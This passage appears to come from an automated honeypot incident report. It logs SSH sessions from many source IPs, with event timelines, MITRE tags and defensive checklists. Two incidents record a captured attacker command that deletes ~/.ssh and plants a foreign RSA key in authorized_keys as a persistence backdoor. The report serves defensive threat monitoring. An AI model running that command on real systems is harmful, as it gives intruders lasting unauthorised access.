| **Last Seen** | 2026-08-29 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:36:01` | `cowrie.session.connect` |
| `2026-08-29 19:36:01` | `cowrie.client.version` |
| `2026-08-29 19:36:02` | `cowrie.client.kex` |
| `2026-08-29 19:36:02` | `cowrie.login.success` |
| `2026-08-29 19:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.159.54[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.159.54[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07108bb40844

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:37 |
| **Last Seen** | 2026-08-29 19:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:37:03` | `cowrie.session.connect` |
| `2026-08-29 19:37:03` | `cowrie.client.version` |
| `2026-08-29 19:37:03` | `cowrie.client.kex` |
| `2026-08-29 19:37:04` | `cowrie.login.success` |
| `2026-08-29 19:37:04` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:37:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:37:04` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6dcf9a3980d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:38 |
| **Last Seen** | 2026-08-29 19:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:38:14` | `cowrie.session.connect` |
| `2026-08-29 19:38:14` | `cowrie.client.version` |
| `2026-08-29 19:38:14` | `cowrie.client.kex` |
| `2026-08-29 19:38:15` | `cowrie.login.success` |
| `2026-08-29 19:38:15` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:38:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:38:16` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccf696178fa9

| Field | Detail |
|---|---|
| **Source IP** | `106.13.114[.]235` |
| **First Seen** | 2026-08-29 19:38 |
| **Last Seen** | 2026-08-29 19:40 |
| **Session Duration** | 81s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:38:58` | `cowrie.session.connect` |
| `2026-08-29 19:38:58` | `cowrie.client.version` |
| `2026-08-29 19:38:58` | `cowrie.client.kex` |
| `2026-08-29 19:38:59` | `cowrie.login.success` |
| `2026-08-29 19:40:19` | `cowrie.session.file_upload` |
| `2026-08-29 19:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.114[.]235` to AbuseIPDB if not already reported
- [ ] Block `106.13.114[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-142e988d7a20

| Field | Detail |
|---|---|
| **Source IP** | `220.82.247[.]216` |
| **First Seen** | 2026-08-29 19:40 |
| **Last Seen** | 2026-08-29 19:40 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:40:15` | `cowrie.session.connect` |
| `2026-08-29 19:40:16` | `cowrie.client.version` |
| `2026-08-29 19:40:16` | `cowrie.client.kex` |
| `2026-08-29 19:40:21` | `cowrie.login.success` |
| `2026-08-29 19:40:22` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:40:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.82.247[.]216` to AbuseIPDB if not already reported
- [ ] Block `220.82.247[.]216` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7969dd5f8a6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-29 19:44 |
| **Last Seen** | 2026-08-29 19:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:44:41` | `cowrie.session.connect` |
| `2026-08-29 19:44:41` | `cowrie.client.version` |
| `2026-08-29 19:44:41` | `cowrie.client.kex` |
| `2026-08-29 19:44:41` | `cowrie.login.success` |
| `2026-08-29 19:44:41` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:44:41` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a831080acd7e

| Field | Detail |
|---|---|
| **Source IP** | `172.160.227[.]37` |
| **First Seen** | 2026-08-29 19:45 |
| **Last Seen** | 2026-08-29 19:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:45:04` | `cowrie.session.connect` |
| `2026-08-29 19:45:04` | `cowrie.client.version` |
| `2026-08-29 19:45:04` | `cowrie.client.kex` |
| `2026-08-29 19:45:04` | `cowrie.login.success` |
| `2026-08-29 19:45:05` | `cowrie.session.params` |
| `2026-08-29 19:45:05` | `cowrie.command.input` |
| `2026-08-29 19:45:05` | `cowrie.command.failed` |
| `2026-08-29 19:45:06` | `cowrie.log.closed` |
| `2026-08-29 19:45:06` | `cowrie.session.params` |
| `2026-08-29 19:45:06` | `cowrie.command.input` |
| `2026-08-29 19:45:06` | `cowrie.session.file_download` |
| `2026-08-29 19:45:06` | `cowrie.log.closed` |
| `2026-08-29 19:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.160.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `172.160.227[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a3aa657f19f

| Field | Detail |
|---|---|
| **Source IP** | `172.160.227[.]37` |
| **First Seen** | 2026-08-29 19:45 |
| **Last Seen** | 2026-08-29 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:45:07` | `cowrie.session.connect` |
| `2026-08-29 19:45:07` | `cowrie.client.version` |
| `2026-08-29 19:45:07` | `cowrie.client.kex` |
| `2026-08-29 19:45:07` | `cowrie.login.success` |
| `2026-08-29 19:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.160.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `172.160.227[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b5fa6683db

| Field | Detail |
|---|---|
| **Source IP** | `172.160.227[.]37` |
| **First Seen** | 2026-08-29 19:45 |
| **Last Seen** | 2026-08-29 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:45:07` | `cowrie.session.connect` |
| `2026-08-29 19:45:07` | `cowrie.client.version` |
| `2026-08-29 19:45:07` | `cowrie.client.kex` |
| `2026-08-29 19:45:08` | `cowrie.login.success` |
| `2026-08-29 19:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.160.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `172.160.227[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a08838e38e28

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:46 |
| **Last Seen** | 2026-08-29 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:46:44` | `cowrie.session.connect` |
| `2026-08-29 19:46:44` | `cowrie.client.version` |
| `2026-08-29 19:46:44` | `cowrie.client.kex` |
| `2026-08-29 19:46:45` | `cowrie.login.success` |
| `2026-08-29 19:46:45` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:46:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:46:46` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6cd12b9a780

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-08-29 19:47 |
| **Last Seen** | 2026-08-29 19:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:47:10` | `cowrie.session.connect` |
| `2026-08-29 19:47:10` | `cowrie.client.version` |
| `2026-08-29 19:47:10` | `cowrie.client.kex` |
| `2026-08-29 19:47:12` | `cowrie.login.success` |
| `2026-08-29 19:47:13` | `cowrie.session.params` |
| `2026-08-29 19:47:13` | `cowrie.command.input` |
| `2026-08-29 19:47:13` | `cowrie.command.failed` |
| `2026-08-29 19:47:13` | `cowrie.log.closed` |
| `2026-08-29 19:47:14` | `cowrie.session.params` |
| `2026-08-29 19:47:14` | `cowrie.command.input` |
| `2026-08-29 19:47:14` | `cowrie.session.file_download` |
| `2026-08-29 19:47:14` | `cowrie.log.closed` |
| `2026-08-29 19:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-011b8b4b677e

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-08-29 19:47 |
| **Last Seen** | 2026-08-29 19:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:47:15` | `cowrie.session.connect` |
| `2026-08-29 19:47:15` | `cowrie.client.version` |
| `2026-08-29 19:47:15` | `cowrie.client.kex` |
| `2026-08-29 19:47:16` | `cowrie.login.success` |
| `2026-08-29 19:47:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731198128e24

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-08-29 19:47 |
| **Last Seen** | 2026-08-29 19:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:47:17` | `cowrie.session.connect` |
| `2026-08-29 19:47:17` | `cowrie.client.version` |
| `2026-08-29 19:47:17` | `cowrie.client.kex` |
| `2026-08-29 19:47:18` | `cowrie.login.success` |
| `2026-08-29 19:47:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c846f870fa2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:49 |
| **Last Seen** | 2026-08-29 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:49:06` | `cowrie.session.connect` |
| `2026-08-29 19:49:06` | `cowrie.client.version` |
| `2026-08-29 19:49:06` | `cowrie.client.kex` |
| `2026-08-29 19:49:07` | `cowrie.login.success` |
| `2026-08-29 19:49:07` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:49:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:49:08` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-507c8f056d60

| Field | Detail |
|---|---|
| **Source IP** | `122.187.230[.]82` |
| **First Seen** | 2026-08-29 19:55 |
| **Last Seen** | 2026-08-29 19:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:55:20` | `cowrie.session.connect` |
| `2026-08-29 19:55:21` | `cowrie.client.version` |
| `2026-08-29 19:55:21` | `cowrie.client.kex` |
| `2026-08-29 19:55:24` | `cowrie.login.success` |
| `2026-08-29 19:55:25` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:55:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.230[.]82` to AbuseIPDB if not already reported
- [ ] Block `122.187.230[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-198450e16ab8

| Field | Detail |
|---|---|
| **Source IP** | `122.170.97[.]94` |
| **First Seen** | 2026-08-29 19:55 |
| **Last Seen** | 2026-08-29 19:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:55:30` | `cowrie.session.connect` |
| `2026-08-29 19:55:31` | `cowrie.client.version` |
| `2026-08-29 19:55:31` | `cowrie.client.kex` |
| `2026-08-29 19:55:32` | `cowrie.login.success` |
| `2026-08-29 19:55:33` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.97[.]94` to AbuseIPDB if not already reported
- [ ] Block `122.170.97[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-473f1b0dabe6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:56 |
| **Last Seen** | 2026-08-29 19:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:56:21` | `cowrie.session.connect` |
| `2026-08-29 19:56:21` | `cowrie.client.version` |
| `2026-08-29 19:56:21` | `cowrie.client.kex` |
| `2026-08-29 19:56:22` | `cowrie.login.success` |
| `2026-08-29 19:56:22` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:56:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:56:23` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-016a8081880a

| Field | Detail |
|---|---|
| **Source IP** | `68.7.114[.]69` |
| **First Seen** | 2026-08-29 19:56 |
| **Last Seen** | 2026-08-29 19:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:56:50` | `cowrie.session.connect` |
| `2026-08-29 19:56:50` | `cowrie.client.version` |
| `2026-08-29 19:56:50` | `cowrie.client.kex` |
| `2026-08-29 19:56:52` | `cowrie.login.success` |
| `2026-08-29 19:56:53` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.7.114[.]69` to AbuseIPDB if not already reported
- [ ] Block `68.7.114[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-666c8f747122

| Field | Detail |
|---|---|
| **Source IP** | `62.122.195[.]14` |
| **First Seen** | 2026-08-29 19:56 |
| **Last Seen** | 2026-08-29 19:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:56:58` | `cowrie.session.connect` |
| `2026-08-29 19:56:58` | `cowrie.client.version` |
| `2026-08-29 19:56:58` | `cowrie.client.kex` |
| `2026-08-29 19:56:59` | `cowrie.login.success` |
| `2026-08-29 19:57:00` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.122.195[.]14` to AbuseIPDB if not already reported
- [ ] Block `62.122.195[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-956a2dd0f589

| Field | Detail |
|---|---|
| **Source IP** | `117.241.77[.]78` |
| **First Seen** | 2026-08-29 19:59 |
| **Last Seen** | 2026-08-29 19:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:59:03` | `cowrie.session.connect` |
| `2026-08-29 19:59:04` | `cowrie.client.version` |
| `2026-08-29 19:59:04` | `cowrie.client.kex` |
| `2026-08-29 19:59:07` | `cowrie.login.success` |
| `2026-08-29 19:59:08` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.241.77[.]78` to AbuseIPDB if not already reported
- [ ] Block `117.241.77[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9b4ca0e8f2c

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-08-29 19:59 |
| **Last Seen** | 2026-08-29 19:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:59:13` | `cowrie.session.connect` |
| `2026-08-29 19:59:14` | `cowrie.client.version` |
| `2026-08-29 19:59:14` | `cowrie.client.kex` |
| `2026-08-29 19:59:16` | `cowrie.login.success` |
| `2026-08-29 19:59:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-145a34e4741f

| Field | Detail |
|---|---|
| **Source IP** | `92.251.124[.]73` |
| **First Seen** | 2026-08-29 19:59 |
| **Last Seen** | 2026-08-29 19:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:59:15` | `cowrie.session.connect` |
| `2026-08-29 19:59:15` | `cowrie.client.version` |
| `2026-08-29 19:59:15` | `cowrie.client.kex` |
| `2026-08-29 19:59:17` | `cowrie.login.success` |
| `2026-08-29 19:59:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:59:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.251.124[.]73` to AbuseIPDB if not already reported
- [ ] Block `92.251.124[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee29ba196cc2

| Field | Detail |
|---|---|
| **Source IP** | `61.12.84[.]172` |
| **First Seen** | 2026-08-29 19:59 |
| **Last Seen** | 2026-08-29 19:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:59:27` | `cowrie.session.connect` |
| `2026-08-29 19:59:28` | `cowrie.client.version` |
| `2026-08-29 19:59:28` | `cowrie.client.kex` |
| `2026-08-29 19:59:29` | `cowrie.login.success` |
| `2026-08-29 19:59:30` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f82b440a5ec

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 19:59 |
| **Last Seen** | 2026-08-29 19:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 19:59:56` | `cowrie.session.connect` |
| `2026-08-29 19:59:56` | `cowrie.client.version` |
| `2026-08-29 19:59:57` | `cowrie.client.kex` |
| `2026-08-29 19:59:58` | `cowrie.login.success` |
| `2026-08-29 19:59:58` | `cowrie.direct-tcpip.request` |
| `2026-08-29 19:59:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 19:59:58` | `cowrie.direct-tcpip.data` |
| `2026-08-29 19:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
